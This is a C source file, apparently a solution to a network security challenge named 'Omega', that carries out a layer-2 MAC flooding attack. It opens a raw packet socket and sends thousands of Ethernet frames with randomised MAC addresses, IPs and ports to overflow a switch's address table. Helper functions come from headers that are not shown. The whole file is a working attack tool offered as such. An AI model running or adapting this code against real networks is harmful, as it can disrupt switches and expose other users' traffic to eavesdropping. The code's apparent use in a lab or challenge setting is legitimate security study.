/**
 * Used to finish the challenge Omega.
 * Operate a l2-flooding attack, to operate the SWITCH-KILL-SWITCH.
 * Author Benxin ZHONG, 1 May. 2020.
*/

#include<stdio.h>
#include<string.h>
#include<unistd.h>
#include<time.h>
#include<sys/socket.h>
#include<stdlib.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include<linux/if_packet.h>
#include<sys/ioctl.h>
#include<sys/socket.h>
#include<net/if.h>
#include<netinet/ether.h>

#include "header.h"
#include "raw_ip.h"

int main(int argc, char *argv[])
{
    srand(time(NULL));

    uint8_t src_l2[6];
    uint8_t dst_l2[6];
    char src_ip[50];
    char dst_ip[50];
    int src_prt = 0;
    int dst_prt = 0;
    int rslt = 0;
    int num_sent = 0;

    char *msg = "hEllO wORLd.";
    uint16_t msg_len = strlen(msg);

    int NUM_REPEAT = 5000;
    int PRINT = 0;

    if(argc > 3)
    {
        printf("Usage : %s [num_repeat [PRINT]]", argv[0]);
        exit(1);
    }
    if(argc >= 2)
        NUM_REPEAT = atoi(argv[1]);
    if(argc == 3 && strcmp(argv[2], "PRINT")==0)
        PRINT = 1;


    // Get the socket number.
    int sock_fd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
    if(sock_fd < 0)
    {
        perror("Err creating raw socket.\n");
        exit(1);
    }
    else
    {
        printf("Raw socket created.\n");
    }

    // Get the interface index.
    // The index of interface.
    struct ifreq if_idx;
    memset(&if_idx, 0, sizeof(struct ifreq));
	strncpy(if_idx.ifr_name, DEFAULT_IF, IFNAMSIZ-1);
    if(ioctl(sock_fd, SIOCGIFINDEX, &if_idx) < 0)
    {
        if(PRINT)
            perror("Err getting the interface.\n");
        exit(1);
    }
    
    int if_ind = if_idx.ifr_ifindex;
    if(PRINT)
        printf("Using interface %d.\n", if_ind);

    // Now send msg.
    for(int i=0; i<NUM_REPEAT; ++i)
    {
        gen_ip(src_ip);
        gen_ip(dst_ip);
        src_prt = gen_prt();
        gen_l2_addr(src_l2);
        gen_l2_addr(dst_l2);

        rslt = send_raw_eth(sock_fd, if_ind, 
                            17, msg, msg_len, src_l2, dst_l2, 
                            src_ip, src_prt, dst_ip, dst_prt, PRINT);

        if(rslt < 0)
        {
            perror("\nSend err ");
            printf("\n");
        }
        else
            ++num_sent;

        int t_sleep = rand() % 200;
        printf("\33[2k\r"); // Delete the current line.
        printf("Processing : %4d/%4d", i+1, NUM_REPEAT);
        usleep(t_sleep * 1000);
    }

    printf("\n");
    printf("Finished. %d sent out of %d.\n", num_sent, NUM_REPEAT);
}